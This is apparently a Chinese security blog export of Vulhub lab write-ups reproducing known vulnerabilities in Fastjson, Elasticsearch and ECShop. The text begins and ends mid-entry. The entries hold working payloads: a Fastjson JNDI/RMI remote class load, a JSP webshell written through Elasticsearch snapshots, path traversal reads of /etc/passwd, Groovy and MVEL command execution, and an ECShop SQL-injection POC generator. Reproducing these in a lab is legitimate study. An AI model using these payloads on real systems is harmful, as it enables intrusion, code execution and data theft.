class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210721/16268479471714.png" alt="image-20210720203339214"></p>
<p>监听端得到反馈</p>
<p><img src="https://image.3001.net/images/20210721/16268479505903.png" alt="image-20210720203433935"></p>
<p>可见，命令<code>touch /tmp/success</code>已成功执行：</p>
<p><img src="https://image.3001.net/images/20210721/16268479539899.png" alt="image-20210720205228437"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson 1.2.47 远程命令执行漏洞</title>
    <url>/2021/07/21/Fastjson%201.2.47%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>
<a id="more"></a>

<p>参考链接：</p>
<ul>
<li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li>
<li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8090</code>即可看到一个json对象被返回，我们将content-type修改为<code>application/json</code>后可向其POST新的JSON对象，后端会利用fastjson进行解析。</p>
<p>首先编译并上传命令执行代码，如<code>http://192.168.44.132/TouchFile.class</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210721/16268478338345.png" alt="image-20210721104233806"></p>
<p>然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;192.168.44.132&#x2F;#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>

<p>向靶场服务器发送Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.44.132:9999&#x2F;TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210721/16268478361325.png" alt="image-20210721105500291"></p>
<p>可见，命令<code>touch /tmp/success</code>已成功执行：</p>
<p><img src="https://image.3001.net/images/20210721/16268478449631.png" alt="image-20210721105551957"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</title>
    <url>/2021/07/19/Elasticsearch%E5%86%99%E5%85%A5webshell%E6%BC%8F%E6%B4%9E%EF%BC%88WooYun-2015-110216%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><a href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）" class="headerlink" title="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"></a>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h1><p>参考文章： <a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html" target="_blank" rel="noopener">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a></p>
<p>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。</p>
<p>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p>
<a id="more"></a>

<p>和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项<code>path.repo</code>中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>简单介绍一下本测试环境。本测试环境同时运行了Tomcat和ElasticSearch，Tomcat目录在<code>/usr/local/tomcat</code>，web目录是<code>/usr/local/tomcat/webapps</code>；ElasticSearch目录在<code>/usr/share/elasticsearch</code>。</p>
<p>我们的目标就是利用ElasticSearch，在<code>/usr/local/tomcat/webapps</code>目录下写入我们的webshell。</p>
<p>首先创建一个恶意索引文档：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -XPOST http:&#x2F;&#x2F;192.168.44.132:9200&#x2F;yz.jsp&#x2F;yz.jsp&#x2F;1 -d&#39;</span><br><span class="line">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</span><br><span class="line">&#39;</span><br></pre></td></tr></table></figure>

<p>再创建一个恶意的存储库，其中<code>location</code>的值即为我要写入的路径。</p>
<blockquote>
<p>这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -XPUT &#39;http:&#x2F;&#x2F;192.168.44.132:9200&#x2F;_snapshot&#x2F;yz.jsp&#39; -d &#39;&#123;</span><br><span class="line">     &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">     &quot;settings&quot;: &#123;</span><br><span class="line">          &quot;location&quot;: &quot;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;wwwroot&#x2F;&quot;,</span><br><span class="line">          &quot;compress&quot;: false</span><br><span class="line">     &#125;</span><br><span class="line">&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>存储库验证并创建:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -XPUT &quot;http:&#x2F;&#x2F;192.168.44.132:9200&#x2F;_snapshot&#x2F;yz.jsp&#x2F;yz.jsp&quot; -d &#39;&#123;</span><br><span class="line">     &quot;indices&quot;: &quot;yz.jsp&quot;,</span><br><span class="line">     &quot;ignore_unavailable&quot;: &quot;true&quot;,</span><br><span class="line">     &quot;include_global_state&quot;: false</span><br><span class="line">&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210719/16266961915308.png" alt="image-20210719173202043"></p>
<p>完成！</p>
<p>访问<code>http://192.168.44.132:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</code>，这就是我们写入的webshell。</p>
<p>该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：<code>http://192.168.44.132:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</code>，</p>
<p><img src="https://image.3001.net/images/20210719/16266961944637.png" alt="image-20210719173244494"></p>
<p>我们再访问/wwwroot/test.jsp就能看到success了：</p>
<p><img src="https://image.3001.net/images/20210719/16266961979872.png" alt="image-20210719173250395"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</title>
    <url>/2021/07/18/ElasticSearch%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5531%EF%BC%89/</url>
    <content><![CDATA[<h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-5531）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-5531）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-5531）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</h1><p>jre版本：openjdk:8-jre</p>
<p>elasticsearch版本：v1.6.0</p>
<p>影响版本：1.6.1以下</p>
<a id="more"></a>

<p>参考文章</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/38383/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/38383/</a></li>
<li><a href="http://www.freebuf.com/vuls/99942.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/99942.html</a></li>
</ul>
<p>说明：</p>
<p>elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在<code>path.repo</code>，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;_snapshot&#x2F;test HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;location&quot;: &quot;&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;repo&#x2F;test&quot; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210719/16266961257780.png" alt="image-20210719171725382"></p>
<h3 id="2-创建一个快照"><a href="#2-创建一个快照" class="headerlink" title="2. 创建一个快照"></a>2. 创建一个快照</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;_snapshot&#x2F;test2 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;location&quot;: &quot;&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;repo&#x2F;test&#x2F;snapshot-backdata&quot; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210719/16266961319916.png" alt="image-20210719171813577"></p>
<h3 id="3-目录穿越读取任意文件"><a href="#3-目录穿越读取任意文件" class="headerlink" title="3. 目录穿越读取任意文件"></a>3. 目录穿越读取任意文件</h3><p>访问 <code>http://192.168.44.132:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code></p>
<p><img src="https://image.3001.net/images/20210719/16266961342287.png" alt="image-20210719172114250"></p>
<p>如上图，在错误信息中包含文件内容（ascii编码后），对其进行解码即可获得文件：</p>
<p><img src="https://image.3001.net/images/20210719/16266961373895.png" alt="image-20210719172514340"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch 命令执行漏洞（CVE-2014-3120）</title>
    <url>/2021/07/17/ElasticSearch%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-3120%EF%BC%89/</url>
    <content><![CDATA[<h1 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）</h1><p>jre版本：openjdk:8-jre</p>
<p>elasticsearch版本：v1.1.1</p>
<p>相关文档：<a href="http://bouk.co/blog/elasticsearch-rce/" target="_blank" rel="noopener">http://bouk.co/blog/elasticsearch-rce/</a> 、 <a href="https://www.t00ls.net/viewthread.php?tid=29408" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=29408</a></p>
<p>老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。</p>
<a id="more"></a>

<p>MVEL执行命令的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">new java.util.Scanner(Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()).useDelimiter(&quot;\\A&quot;).next();</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>将Java代码放入json中：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"query"</span>: &#123;</span><br><span class="line">      <span class="attr">"filtered"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>: &#123;</span><br><span class="line">          <span class="attr">"match_all"</span>: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"script_fields"</span>: &#123;</span><br><span class="line">        <span class="attr">"command"</span>: &#123;</span><br><span class="line">            <span class="attr">"script"</span>: <span class="string">"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;website&#x2F;blog&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;phithon&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，执行任意代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;_search?pretty HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 343</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;size&quot;: 1,</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">      &quot;filtered&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &#123;</span><br><span class="line">          &quot;match_all&quot;: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;script_fields&quot;: &#123;</span><br><span class="line">        &quot;command&quot;: &#123;</span><br><span class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如图：</p>
<p><img src="https://image.3001.net/images/20210719/16266960644920.png" alt="image-20210719104741517"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch 插件目录穿越漏洞（CVE-2015-3337）</title>
    <url>/2021/07/16/ElasticSearch%20%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-3337%EF%BC%89/</url>
    <content><![CDATA[<h1 id="ElasticSearch-插件目录穿越漏洞（CVE-2015-3337）"><a href="#ElasticSearch-插件目录穿越漏洞（CVE-2015-3337）" class="headerlink" title="ElasticSearch 插件目录穿越漏洞（CVE-2015-3337）"></a>ElasticSearch 插件目录穿越漏洞（CVE-2015-3337）</h1><p>jre版本：openjdk:8-jre</p>
<p>elasticsearch版本：v1.4.4</p>
<p>影响版本：1.4.5以下/1.5.2以下</p>
<p>在安装了具有“site”功能的插件以后，插件目录使用<code>../</code>即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。</p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试环境默认安装了一个插件：<code>elasticsearch-head</code>，主页在此：<a href="https://github.com/mobz/elasticsearch-head" target="_blank" rel="noopener">https://github.com/mobz/elasticsearch-head</a></p>
<p>head插件提供了elasticsearch的前端页面，访问 <code>http://your-ip:9200/_plugin/head/</code> 即可看到</p>
<p><img src="https://image.3001.net/images/20210719/16266960158663.png" alt="image-20210719170218421"></p>
<p>访问<code>http://192.168.44.132:9200/_plugin/head/../../../../../../../../../etc/passwd</code>读取任意文件（不要在浏览器访问）：</p>
<p><img src="https://image.3001.net/images/20210719/16266960186751.png" alt="image-20210719170653379"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</title>
    <url>/2021/07/16/ElasticSearch%20Groovy%20%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%20&amp;&amp;%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-1427%EF%BC%89/</url>
    <content><![CDATA[<h1 id="ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><a href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</h1><p>jre版本：openjdk:8-jre</p>
<p>elasticsearch版本：v1.4.2</p>
<a id="more"></a>

<p>参考文章：</p>
<ul>
<li><a href="http://cb.drops.wiki/drops/papers-5107.html" target="_blank" rel="noopener">http://cb.drops.wiki/drops/papers-5107.html</a></li>
<li><a href="http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/" target="_blank" rel="noopener">http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/</a></li>
<li><a href="https://github.com/XiphosResearch/exploits" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits</a></li>
<li><a href="http://cb.drops.wiki/drops/papers-5142.html" target="_blank" rel="noopener">http://cb.drops.wiki/drops/papers-5142.html</a></li>
</ul>
<p>CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。</p>
<h2 id="Groovy语言“沙盒”"><a href="#Groovy语言“沙盒”" class="headerlink" title="Groovy语言“沙盒”"></a>Groovy语言“沙盒”</h2><p>ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：</p>
<ol>
<li>既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射</li>
<li>Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言</li>
</ol>
<p>所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。</p>
<p>Java沙盒绕过法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.Math.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;id&quot;).getText()</span><br></pre></td></tr></table></figure>

<p>Goovy直接执行命令法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def command&#x3D;&#39;id&#39;;def res&#x3D;command.execute().text;res</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;website&#x2F;blog&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后发送包含payload的数据包，执行任意命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;_search?pretty HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;text</span><br><span class="line">Content-Length: 156</span><br><span class="line"></span><br><span class="line">&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>结果如图所示：</p>
<p><img src="https://image.3001.net/images/20210719/16266959541435.png" alt="image-20210719105426920"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>ECShop 2.x/3.x SQL注入/远程代码执行漏洞</title>
    <url>/2021/07/15/ECShop%202.x3.x%20SQL%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="ECShop-2-x-3-x-SQL注入-远程代码执行漏洞"><a href="#ECShop-2-x-3-x-SQL注入-远程代码执行漏洞" class="headerlink" title="ECShop 2.x/3.x SQL注入/远程代码执行漏洞"></a>ECShop 2.x/3.x SQL注入/远程代码执行漏洞</h1><p>ECShop是一个B2C独立开店系统，供企业和个人快速搭建个性化网店。本系统是一个基于PHP语言和MYSQL数据库架构的跨平台开源程序。</p>
<p>2017年及之前的版本存在SQL注入漏洞，可以注入payload并最终导致代码执行漏洞。最新版本3.6.0已修复该漏洞，vulhub使用其最新版本2.7.3和3.6.0非最新版本重现该漏洞。</p>
<a id="more"></a>

<p>参考链接：</p>
<ul>
<li><a href="https://paper.seebug.org/691/" target="_blank" rel="noopener">https://paper.seebug.org/691/</a></li>
</ul>
<p>环境启动后，访问<code>http://192.168.44.132:8080</code>，您将看到 2.7.3 安装页面。访问<code>http://192.168.44.132:8081</code>，您将看到 3.6.0 安装页面。</p>
<p>两个都安装，mysql地址是<code>mysql</code>，mysql账号和密码是<code>root</code>，数据库名随便填，但是2.7.3和3.6.0的数据库名不能一样。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>可以为 2.x 和 3.x 生成 POC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = bin2hex(<span class="string">"&#123;\$asd'];phpinfo\t();//&#125;xxx"</span>);</span><br><span class="line">$id = <span class="string">"-1' UNION/*"</span>;</span><br><span class="line">$arr = [</span><br><span class="line">    <span class="string">"num"</span> =&gt; sprintf(<span class="string">'*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -'</span>, bin2hex($id), $shell),</span><br><span class="line">    <span class="string">"id"</span> =&gt; $id</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$s = serialize($arr);</span><br><span class="line"></span><br><span class="line">$hash3 = <span class="string">'45ea207d7a2b68c49582d2d22adf953a'</span>;</span><br><span class="line">$hash2 = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"POC for ECShop 2.x: \n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;$hash2&#125;ads|&#123;$s&#125;&#123;$hash2&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n\nPOC for ECShop 3.x: \n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;$hash3&#125;ads|&#123;$s&#125;&#123;$hash3&#125;"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210719/16266616799111.png" alt="image-20210719095624334"></p>
<p>将 POC 放在 HTTP-Referer 中：</p>
